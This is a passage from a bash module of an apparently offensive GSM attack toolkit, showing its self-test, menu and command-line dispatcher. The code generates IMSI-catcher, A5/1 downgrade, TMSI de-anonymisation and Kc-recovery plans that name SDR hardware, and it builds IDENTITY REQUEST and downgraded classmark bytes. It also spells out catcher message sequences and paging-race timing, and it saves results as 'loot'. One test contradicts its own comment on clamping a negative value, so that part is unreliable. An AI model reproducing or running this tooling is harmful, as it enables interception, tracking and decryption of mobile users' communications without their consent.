        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    export LOOT_DIR="$d/loot"
    export CAPTURES_DIR="$d/captures"
    export GATK_DIR="$d/loot/gsm_attack"

    # 1. Plan files: written, labelled handoff, and they name real hardware.
    local p
    for p in imsi-catcher a5-downgrade tmsi-deanon kc-recovery; do
        out=$(gatk_write_plan "$p"); rc=$?
        chk "plan-${p}-rc"     "$rc" "0"
        local f; f=$(printf '%s' "$out" | cut -f2)
        chk "plan-${p}-exists" "$([[ -f "$f" ]] && echo yes || echo no)" "yes"
        chk "plan-${p}-status" "$(awk -F'\t' '$1=="status"{print $2}' "$f")" "handoff"
        chk "plan-${p}-names-hw" \
            "$(awk -F'\t' '$1=="hardware"{print ($2 ~ /SDR/) ? "y" : "n"}' "$f")" "y"
        chk "plan-${p}-not-empty" "$([[ -s "$f" ]] && echo yes || echo no)" "yes"
    done
    chk plan-count "$(gatk_plan_count)" "4"

    #    Each plan must carry real steps, not a stub.
    chk plan-imsi-steps  "$(awk -F'\t' '$1 ~ /^step/{n++} END{print (n>=6)?"y":"n"}' \
                            "$(gatk_plan_path imsi-catcher)")" "y"
    chk plan-kc-methods "$(grep -c '^method' "$(gatk_plan_path kc-recovery)")" "3"
    chk plan-kc-bits    "$(awk -F'\t' '$1=="method_a_two_known_plaintext"{print ($2 ~ /456/) ? "y":"n"}' \
                            "$(gatk_plan_path kc-recovery)")" "y"
    chk plan-tmsi-group "$(awk -F'\t' '$1=="paging_mapping"{print ($2 ~ /1024/) ? "y":"n"}' \
                            "$(gatk_plan_path tmsi-deanon)")" "y"

    #    An unknown plan name must fail and write nothing.
    chk plan-unknown-rc   "$(gatk_write_plan 'no-such-plan' >/dev/null 2>&1; echo $?)" "2"
    chk plan-unknown-cmd  "$(gatk_cmd_plan 'no-such-plan' >/dev/null 2>&1; echo $?)"  "2"
    chk plan-missing-arg  "$(gatk_cmd_plan >/dev/null 2>&1; echo $?)" "2"
    chk plan-no-stray     "$(ls "$GATK_DIR" | grep -c 'no-such-plan')" "0"

    # 2. Classmark encoder: byte-exact against a hand-computed encoding.
    #    revision=3, es_ind=0, a5/1=1, rfpow=3 -> o1 = 3 | 0 | 8 | 0x30 = 0x3b
    #    ss_screen=1 (bit2 set -> bit index 1), sm_cap=1 (bit4 -> index 3)
    #      -> o2 = 2 | 8 = 0x0a
    #    cm3=0, lcs=0, ps=1 (bit3 -> index 2) -> o3 = 4
    #    a5/2..a5/7 = 0, cmsp=0 -> o4 = 0
    #    so_lsa=0, ucs2=0 -> o5 = 0
    chk cm-default "$(gatk_classmark_encode)" "3b0a040000"
    #    A5/1 cleared must clear exactly bit 4 of octet 1: 0x3b -> 0x33.
    chk cm-no-a51  "$(gatk_classmark_encode 3 0 0 3)" "330a040000"
    #    A5/3 capability sets bit 2 of octet 4 -> 0x02.
    chk cm-a53     "$(gatk_classmark_encode 3 0 1 3 1 1 0 0 0 0 0 0 1 0 1)" "3b0a040200"
    #    Full field independence: revision=0, es_ind=1, a5/1=1, rfpow=7
    #      o1 = 0 | (1<<2) | (1<<3) | (7<<4) = 0x7c
    chk cm-rfpow7  "$(gatk_classmark_encode 0 1 1 7)" "7c0a040000"
    #    Dropping ES-IND to 0 must clear exactly bit 3: 0x7c -> 0x78.
    chk cm-esind0  "$(gatk_classmark_encode 0 0 1 7)" "780a040000"
    #    revision 3 = R99 or later, revision 0 = phase 1.
    chk cm-rev0    "$(gatk_classmark_encode 0 0 1 3)" "380a040000"

    #    Round-trip: encode then decode must return every input field.
    local cm; cm=$(gatk_classmark_encode 3 0 1 5 3 1 1 0 0 0 1 0 1 1 1 0 0 0 0 1 0 1)
    out=$(gatk_classmark_decode "$cm")
    chk cm-rt-rev   "$(fld "$out" revision)"  "3"
    chk cm-rt-a51   "$(fld "$out" a5_1)"      "1"
    chk cm-rt-rfpw  "$(fld "$out" rf_power)"  "5"
    chk cm-rt-ss    "$(fld "$out" ss_screen)" "3"
    chk cm-rt-sm    "$(fld "$out" sm_cap)"    "1"
    chk cm-rt-vbs   "$(fld "$out" vbs)"       "1"
    chk cm-rt-cm3   "$(fld "$out" cm3)"       "1"
    chk cm-rt-pa52  "$(fld "$out" a5_2)"      "1"
    chk cm-rt-a53   "$(fld "$out" a5_3)"      "1"
    chk cm-rt-cmsp  "$(fld "$out" cmsp)"      "1"
    chk cm-rt-ucs2  "$(fld "$out" ucs2)"      "1"
    chk cm-rt-len   "$(printf '%s' "$cm" | wc -c | tr -d ' ')" "10"

    #    Argument validation.
    chk cm-bad-hex  "$(gatk_classmark_decode 'zz' >/dev/null 2>&1; echo $?)" "2"
    chk cm-short    "$(gatk_classmark_decode 'aabb' >/dev/null 2>&1; echo $?)" "2"
    chk cm-bad-rev  "$(gatk_classmark_encode 9 >/dev/null 2>&1; echo $?)" "2"
    chk cm-bad-rfp  "$(gatk_classmark_encode 3 0 1 9 >/dev/null 2>&1; echo $?)" "2"
    chk cm-bad-num  "$(gatk_classmark_encode x >/dev/null 2>&1; echo $?)" "2"

    #    The downgrade edit must clear A5/1 and change nothing else.
    out=$(gatk_classmark_downgrade 3b0a040000)
    chk cm-down-after "$(fld "$out" after)"  "330a040000"
    chk cm-down-field "$(fld "$out" cleared_field)" "a5_1"
    chk cm-down-bad   "$(gatk_classmark_downgrade 'zz' >/dev/null 2>&1; echo $?)" "2"

    # 3. Identity Request construction, byte-exact.
    out=$(gatk_build_identity_request 1)
    chk ir-octets  "$(fld "$out" octets)" "050501"
    chk ir-name    "$(fld "$out" identity_type)" "1"
    out=$(gatk_build_identity_request 4)
    chk ir-tmsi    "$(fld "$out" octets)" "050504"
    chk ir-bad-zero "$(gatk_build_identity_request 0 >/dev/null 2>&1; echo $?)" "2"
    chk ir-bad-high "$(gatk_build_identity_request 9 >/dev/null 2>&1; echo $?)" "2"
    chk ir-bad-text "$(gatk_build_identity_request x >/dev/null 2>&1; echo $?)" "2"

    # 4. IMSI catcher sequence: real channels and message types.
    local seq; seq=$(gatk_imsi_catcher_sequence)
    chk seq-steps      "$(printf '%s\n' "$seq" | tail -n +2 | grep -c .)" "14"
    chk seq-fields     "$(printf '%s\n' "$seq" | awk -F'\t' 'NF!=6' | grep -c .)" "0"
    chk seq-rach       "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="RACH"{print $4}')" "CHANNEL REQUEST"
    chk seq-agch       "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="AGCH"{print $5}')" "0x3f"
    chk seq-sdcch      "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="SDCCH"' | grep -c .)" "7"
    chk seq-id-req     "$(printf '%s\n' "$seq" | awk -F'\t' '$4=="IDENTITY REQUEST"{print $5}')" "0x05"
    chk seq-id-resp    "$(printf '%s\n' "$seq" | awk -F'\t' '$4=="IDENTITY RESPONSE"{print $5}')" "0x06"
    chk seq-si3        "$(printf '%s\n' "$seq" | awk -F'\t' '$4 ~ /TYPE 3$/{print $5}')" "0x1b"

    # 5. Paging race arithmetic. One TDMA frame is 4.615 ms; a 51-multiframe
    #    is 51 * 4.615 = 235.4 ms.
    out=$(gatk_paging_race 3)
    chk race-mf-ms   "$(fld "$out" multiframe_ms)" "235.4"
    chk race-lead-ms "$(fld "$out" attacker_lead_ms)" "13.85"
    chk race-frames  "$(fld "$out" multiframe_frames)" "51"
    out=$(gatk_paging_race 0)
    chk race-lose    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="verdict"{print ($2 ~ /loses/) ? "y":"n"}')" "y"
    chk race-bad     "$(gatk_paging_race abc >/dev/null 2>&1; echo $?)" "2"

    # 6. C1 reselection arithmetic (TS 45.008 section 6.4).
    #    A = -100 - (-90) = -10 ; B = 33 - 30 = 3 ; C1 = -10 - 3 = -13
    out=$(gatk_c1 -100 -90 33 30)
    chk c1-A   "$(fld "$out" A_dbm)"  "-10"
    chk c1-B   "$(fld "$out" B_dbm)"  "3"
    chk c1-C1  "$(fld "$out" C1_dbm)" "-13"
    chk c1-sel "$(fld "$out" selectable)" "no"
    #    A positive C1 comes from a strong signal: A = -90-(-105) = 15,
    #    B = 33-33 = 0 -> C1 = 15.
    out=$(gatk_c1 -90 -105 33 33)
    chk c1-positive "$(fld "$out" C1_dbm)" "15"
    chk c1-selectable "$(fld "$out" selectable)" "yes"
    #    A negative B is clamped to zero, not subtracted.
    out=$(gatk_c1 -90 -105 20 33)
    chk c1-clampB "$(fld "$out" B_dbm)" "-13"
    chk c1-clampC1 "$(fld "$out" C1_dbm)" "15"
    chk c1-bad-args "$(gatk_c1 1 2 3 >/dev/null 2>&1; echo $?)" "2"
    chk c1-bad-text "$(gatk_c1 a b c d >/dev/null 2>&1; echo $?)" "2"

    # 7. Kc recovery facts: the byte counts the attack actually needs.
    out=$(gatk_kc_recovery_facts)
    chk kc-frame-bits  "$(fld "$out" frame_bits)" "228"
    chk kc-req-bits    "$(fld "$out" keystream_bits_required)" "456"
    chk kc-frames      "$(fld "$out" frames_required)" "2"
    chk kc-bits        "$(fld "$out" kc_bits)" "64"
    chk kc-eff-bits    "$(fld "$out" kc_effective_bits)" "54"
    chk kc-zero-bits   "$(fld "$out" comp128_zero_bits)" "10"
    chk kc-burst-bits  "$(fld "$out" burst_cipher_bits)" "114"
    chk kc-2x114       "$(( $(fld "$out" burst_cipher_bits) * 2 ))" "$(fld "$out" frame_bits)"
    chk kc-2x228       "$(( $(fld "$out" frame_bits) * 2 ))"       "$(fld "$out" keystream_bits_required)"
    chk kc-64-minus-10 "$(( $(fld "$out" kc_bits) - $(fld "$out" comp128_zero_bits) ))" "$(fld "$out" kc_effective_bits)"

    # 8. Hex plumbing, shared contract with 10_gsm_air.sh.
    chk hex-norm   "$(gatk_norm_hex 'AB CD')" "abcd"
    chk hex-bits   "$(gatk_hex_to_bits 'a5')" "10100101"
    chk bits-hex   "$(gatk_bits_to_hex '10100101')" "a5"
    chk hex-rt     "$(gatk_bits_to_hex "$(gatk_hex_to_bits 'deadbeef')")" "deadbeef"

    # 9. Sanitisation of untrusted text.
    local evil; evil=$(gatk_sanitize $'Evil\tCell\r\nRow')
    chk sanitize-tabs "$(printf '%s' "$evil" | tr -cd '\t' | wc -c | tr -d ' ')" "0"
    chk sanitize-nl   "$(printf '%s' "$evil" | tr -cd '\n' | wc -c | tr -d ' ')" "0"

    # 10. Status TSV contract. SDR presence is environment-dependent.
    out=$(gatk_cli_status_tsv)
    chk status-dir     "$(fld "$out" dir)"   "$GATK_DIR"
    chk status-plans   "$(fld "$out" plans)" "4"
    chk status-kcbits  "$(fld "$out" kc_frame_bits)"    "228"
    chk status-kcreq   "$(fld "$out" kc_bits_required)" "456"
    chk status-tx-field "$(printf '%s\n' "$out" | grep -c '^tx_sdr')" "1"

    # 11. CLI dispatch: unknown verb is a usage error, not a success.
    chk cli-unknown "$(gatk_cli_main --nope >/dev/null 2>&1; echo $?)" "2"

    rm -rf "$d"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
gatk_menu() {
    local c
    while true; do
        banner
        echo -e "  ${C_MAG}=== GSM attack ===${C_RESET}"
        echo -e "  tx sdr: ${C_GRN}$(gatk_find_tx_sdr || echo none)${C_RESET}"
        echo -e "  rx sdr: ${C_GRN}$(gatk_find_rx_sdr || echo none)${C_RESET}"
        echo -e "  plans:  ${C_GRN}$(gatk_plan_count)${C_RESET}  ${C_DIM}$GATK_DIR${C_RESET}\n"
        cat << 'M'
  [1]  IMSI catcher plan            (needs TX SDR)
  [2]  A5/1 downgrade plan          (needs TX SDR)
  [3]  TMSI de-anonymisation plan   (needs TX SDR)
  [4]  Kc recovery plan             (needs RX SDR + tables)
  [5]  show the RACH->AGCH->SDCCH sequence
  [6]  paging-response race timing
  [7]  classmark encode / decode
  [8]  classmark downgrade (clear A5/1)
  [9]  build an Identity Request
  [10] Kc recovery facts
  [11] list written plans
  [0]  back

M
        if [[ -n "${IMSISTING_CLI:-}" ]]; then
            echo "[-] menu unavailable in CLI mode" >&2; return 1
        fi
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1) gatk_cmd_plan imsi-catcher | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            2) gatk_cmd_plan a5-downgrade | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            3) gatk_cmd_plan tmsi-deanon | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            4) gatk_cmd_plan kc-recovery | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            5) gatk_cmd_imsi_catcher_sequence | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            6)
                read -rp "  attacker lead in frames (default 3)> " l
                gatk_paging_race "${l:-3}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            7)
                read -rp "  classmark hex (blank = default encode)> " h
                gatk_cmd_classmark "$h" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            8)
                read -rp "  classmark hex> " h
                gatk_classmark_downgrade "$h" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            9)
                read -rp "  identity type (1=IMSI 2=IMEI 3=IMEISV 4=TMSI)> " t
                gatk_build_identity_request "${t:-1}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            10) gatk_cmd_kc_recovery | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            11) gatk_cmd_plan_tsv | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
gatk_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)          gatk_cli_status_tsv ;;
        --plan)                gatk_cmd_plan "${1:-}" ;;
        --plan-tsv)            gatk_cmd_plan_tsv ;;
        --classmark)           gatk_cmd_classmark "${1:-}" ;;
        --classmark-downgrade) gatk_classmark_downgrade "${1:-}" ;;
        --build-identity-request) gatk_build_identity_request "${1:-1}" ;;
        --imsi-catcher-sequence)  gatk_cmd_imsi_catcher_sequence ;;
        --paging-race)         gatk_paging_race "${1:-3}" ;;
        --c1)                  gatk_c1 "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
        --kc-recovery)         gatk_cmd_kc_recovery ;;
        --selftest)            gatk_selftest ;;
        --menu)                gatk_menu ;;
        *)
            cat >&2 <<EOF
GSM Attack — IMSI catcher, A5/1 downgrade, TMSI de-anonymisation, Kc recovery

Usage: $0 COMMAND
  --status-tsv                 radio and plan state as TSV
  --plan <name>                write a handoff plan file and report the hardware
                               names: imsi-catcher a5-downgrade tmsi-deanon kc-recovery
  --plan-tsv                   list written plan files
  --classmark [hex]            encode the default classmark, or decode one given
  --classmark-downgrade <hex>  clear the A5/1 bit so the MS advertises no A5/1
  --build-identity-request [n] IDENTITY REQUEST bytes, 1=IMSI 2=IMEI 3=IMEISV 4=TMSI
  --imsi-catcher-sequence      the RACH->AGCH->SDCCH message sequence
  --paging-race [frames]       paging-response race timing in TDMA frames
  --c1 <min> <avg> <max> <p>   C1 reselection arithmetic in dBm
  --kc-recovery                Kc recovery arithmetic and method notes
  --selftest                   verify sequence, classmark and arithmetic, no radio
  --menu                       interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    gatk_cli_main "$@"
fi
